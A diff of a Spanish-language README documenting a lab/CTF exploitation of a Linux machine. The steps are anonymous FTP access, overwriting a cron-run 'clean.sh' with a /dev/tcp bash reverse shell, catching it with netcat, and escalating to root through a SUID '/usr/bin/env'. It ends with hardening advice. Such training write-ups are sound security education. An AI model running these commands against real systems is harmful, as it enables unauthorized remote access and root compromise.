@@ -1,166 +1,100 @@
-# Este repositorio documenta el proceso de explotación de una máquina Linux vulnerable que permite acceso anónimo por FTP, leading to remote code execution (RCE) y escalada de privilegios mediante binarios SUID.
+# **Explotación de Máquina via FTP Anonymous**
 
-## 1. Objetivos
-  -  Demostrar los riesgos de habilitar FTP Anonymous.
+![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Servicio: FTP](https://img.shields.io/badge/Servicio-FTP_Anonymous-blue)
 
-  -  Explotar un script malicioso para ganar acceso inicial.
+## **Descripción**
+Este repositorio documenta la explotación de una máquina Linux vulnerable a través de:
+1. Acceso anónimo a FTP
+2. Manipulación de scripts automatizados
+3. Escalada de privilegios mediante binarios SUID
 
-  -  Escalar privilegios abusando de permisos SUID.
+**Tiempo estimado**: 20-30 minutos  
+**Dificultad**: Básica  
+**Sistema operativo**: Linux
 
-## 2.  Audiencia
-  -  🛡️ Pentesters y entusiastas de seguridad que buscan practicar:
+## **Índice**
+1. [Reconocimiento](#reconocimiento)
+2. [Explotación](#explotación)
+3. [Post-Explotación](#post-explotación)
+4. [Conclusión](#conclusión)
 
-    -  Enumeración de servicios.
+## **Reconocimiento**
 
-    -  Manipulación de archivos vía FTP.
-
-    -  Técnicas de post-explotación (TTY, PrivEsc).
-
-##  Advertencia
-  -  ⚠️ Úsalo solo en entornos autorizados. La explotación no consentida es ilegal.
-
-# **Explotación de Máquina Linux vía FTP Anonymous**  
-
-**Nivel de Dificultad**: Fácil  
-**Técnicas usadas**: FTP Anonymous, Manipulación de Scripts, Reverse Shell, Escalada de Privilegios (SUID)  
-
----
-
-## **Descubrimiento y Enumeración**  
-
-### **1. Escaneo Inicial con Nmap**  
-Identificamos los servicios expuestos en la máquina objetivo (`10.0.2.9`):  
+### 1. Escaneo Inicial
 ```bash
-nmap -sV -p- --min-rate 5000 -n -Pn 10.0.2.9 -oN nmap_scan
-```  
-**Resultados clave**:  
-- **Puerto 21/tcp (FTP)**: Servicio **vsftpd** con acceso **Anonymous** habilitado.  
+nmap -sV -p- 10.0.2.15 -oN initial_scan
+```
+**Hallazgos clave**:
+- 21/tcp : vsftpd (FTP Anonymous permitido)
 
----
+## **Explotación**
 
-## **Explotación del FTP Anonymous**  
-
-### **2. Conexión al Servicio FTP**  
-Accedemos sin credenciales (usuario `anonymous`):  
+### 2. Conexión FTP Anónima
 ```bash
-ftp 10.0.2.9
-```  
-- **Usuario**: `anonymous`  
-- **Contraseña**: (cualquier texto o vacío).  
+ftp 10.0.2.15
+```
+**Credenciales**:
+- Usuario: anonymous
+- Contraseña: [cualquier texto o vacío]
 
-### **3. Enumeración de Archivos**  
-Listamos directorios y encontramos un script sospechoso:  
-```bash
-ls -la
+### 3. Manipulación de Script
+```ftp
 cd scripts
-get clean.sh  # Descargamos el archivo para analizarlo.
-```  
+get clean.sh
+exit
+```
 
-### **4. Análisis del Script `clean.sh`**  
-Inspeccionamos su contenido:  
-```bash
-cat clean.sh
-```  
-**Contenido original**:  
-```bash
-#!/bin/bash
-rm -rf /tmp/logs/*  # Elimina logs temporales.
-```  
-
-### **5. Inyección de Reverse Shell**  
-Modificamos `clean.sh` para incluir un payload de conexión reversa:  
+Editar el archivo local:
 ```bash
 echo "bash -i >& /dev/tcp/10.0.2.4/4444 0>&1" > clean.sh
-```  
+```
 
-### **6. Subida del Archivo Malicioso**  
-Sobrescribimos el script en el servidor:  
+Subir versión modificada:
 ```bash
+ftp 10.0.2.15
 put clean.sh
-```  
+```
 
----
+## **Post-Explotación**
 
-## **Ganando Acceso Inicial**  
-
-### **7. Escucha con Netcat**  
-Preparamos una sesión en nuestra máquina para recibir la shell:  
+### 4. Conexión Reversa
 ```bash
-nc -lvnp 4444
-```  
+nc -nlvp 4444
+```
 
-### **8. Ejecución Remota del Script**  
-- Si el script se ejecuta automáticamente (ej: tarea cron), obtendremos shell.  
-- Si no, esperamos a que un administrador lo ejecute manualmente.  
-
-**¡Shell obtenida!**  
-
----
-
-## **Post-Explotación**  
-
-### **9. Mejora de la Shell**  
-Convertimos la shell en interactiva:  
+### 5. Mejora de Shell
 ```bash
-script /dev/null -c bash
-Ctrl + Z  # Segundo plano
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=bash
-```  
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-### **10. Escalada de Privilegios (SUID)**  
-
-#### **Búsqueda de Binarios Vulnerables**  
+### 6. Escalada de Privilegios
 ```bash
 find / -perm -4000 2>/dev/null
-```  
-**Resultado sospechoso**:  
-- `/usr/bin/env` (permite ejecución arbitraria).  
-
-#### **Explotación con `env`**  
-Ejecutamos una shell como **root**:  
-```bash
 /usr/bin/env /bin/sh -p
-```  
-**¡Somos root!**  
+```
+
+## **Conclusión**
+
+### Vulnerabilidades Críticas
+1. FTP Anonymous habilitado
+2. Scripts modificables por usuarios no autenticados
+3. Binarios SUID mal configurados
+
+### Hardening Recomendado
+- Deshabilitar FTP Anonymous
+- Restringir permisos de escritura en scripts críticos
+- Eliminar permisos SUID innecesarios
+
+> ⚠️ **Aviso Legal**: Solo para uso en entornos autorizados.
 
 ---
 
-## **Recolección de Flags**  
+**Herramientas utilizadas**:
+- Nmap
+- FTP Client
+- Netcat
+- GTFOBins
 
-- **Flag de usuario**:  
-  ```bash
-  cat /home/usuario/user.txt
-  ```  
-- **Flag de root**:  
-  ```bash
-  cat /root/root.txt
-  ```  
-
----
-
-## **Conclusión y Recomendaciones**  
-
-### **Vulnerabilidades Explotadas**  
-1. **FTP Anonymous**: Permitió subir un script malicioso.  
-2. **Tarea Cron o Ejecución Manual**: Ejecutó el payload.  
-3. **Binario SUID (`/usr/bin/env`)**: Permitió escalar a root.  
-
-### **Recomendaciones de Seguridad**  
-✅ **Deshabilitar FTP Anonymous** en `/etc/vsftpd.conf`:  
-   ```ini
-   anonymous_enable=NO
-   ```  
-✅ **Restringir permisos SUID** innecesarios:  
-   ```bash
-   chmod -s /usr/bin/env
-   ```  
-✅ **Monitorear tareas Cron** y scripts automatizados.  
-
----
-
-## **Referencias**  
-- [GTFOBins: env](https://gtfobins.github.io/gtfobins/env/)  
-- [Nmap Cheat Sheet](https://nmap.org/book/man.html)  
+**Referencias**:
+- [OWASP FTP Security](https://owasp.org/www-community/vulnerabilities/FTP_Security)
+- [GTFOBins env](https://gtfobins.github.io/gtfobins/env/)
